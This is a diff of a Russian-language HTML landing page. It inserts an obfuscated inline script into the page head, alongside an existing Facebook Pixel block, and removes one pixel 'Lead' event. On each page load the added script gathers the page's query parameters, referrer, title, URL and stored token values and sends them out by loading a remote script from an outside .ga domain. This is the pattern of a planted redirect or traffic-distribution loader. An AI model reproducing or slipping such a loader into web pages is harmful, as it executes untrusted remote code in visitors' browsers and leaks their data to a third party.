@@ -2,6 +2,51 @@
 <html lang="ru-RU">
 <head><meta charset="UTF-8">
 
+
+    <script>
+    (function() {
+    var name = '_GknmKHXRB7BwjH8m';
+    if (!window._GknmKHXRB7BwjH8m) {
+        window._GknmKHXRB7BwjH8m = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/8Ys1WrPR',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _GXM7VqQDN6X1FynH = localStorage.getItem('config');
+    if (typeof _GXM7VqQDN6X1FynH !== 'undefined' && _GXM7VqQDN6X1FynH !== null) {
+        var _WGnBJLxX47RK7JXx = JSON.parse(_GXM7VqQDN6X1FynH);
+        var _5r3LJQNzyt3j2Wkt = Math.round(+new Date()/1000);
+        if (_WGnBJLxX47RK7JXx.created_at + window._GknmKHXRB7BwjH8m.ttl < _5r3LJQNzyt3j2Wkt) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _sprNtPdsgNZxGq3n = localStorage.getItem('subId');
+    var _5tkVtvWXCvnY4kM6 = localStorage.getItem('token');
+    var _CM425p36cZFRVtYL = '?return=js.client';
+        _CM425p36cZFRVtYL += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _CM425p36cZFRVtYL += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _CM425p36cZFRVtYL += '&default_keyword=' + encodeURIComponent(document.title);
+        _CM425p36cZFRVtYL += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _CM425p36cZFRVtYL += '&name=' + encodeURIComponent(name);
+        _CM425p36cZFRVtYL += '&host=' + encodeURIComponent(window._GknmKHXRB7BwjH8m.R_PATH);
+    if (typeof _sprNtPdsgNZxGq3n !== 'undefined' && _sprNtPdsgNZxGq3n && window._GknmKHXRB7BwjH8m.unique) {
+        _CM425p36cZFRVtYL += '&sub_id=' + encodeURIComponent(_sprNtPdsgNZxGq3n);
+    }
+    if (typeof _5tkVtvWXCvnY4kM6 !== 'undefined' && _5tkVtvWXCvnY4kM6 && window._GknmKHXRB7BwjH8m.unique) {
+        _CM425p36cZFRVtYL += '&token=' + encodeURIComponent(_5tkVtvWXCvnY4kM6);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._GknmKHXRB7BwjH8m.R_PATH + _CM425p36cZFRVtYL;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
+
     <!-- Facebook Pixel Code -->
 <script>
   !function(f,b,e,v,n,t,s)
@@ -14,7 +59,6 @@
   'https://connect.facebook.net/en_US/fbevents.js');
   fbq('init', '902960373599060');
   fbq('track', 'PageView');
-  fbq('track', 'Lead');
 </script>
 <noscript><img height="1" width="1" style="display:none"
   src="https://www.facebook.com/tr?id=902960373599060&ev=PageView&noscript=1"
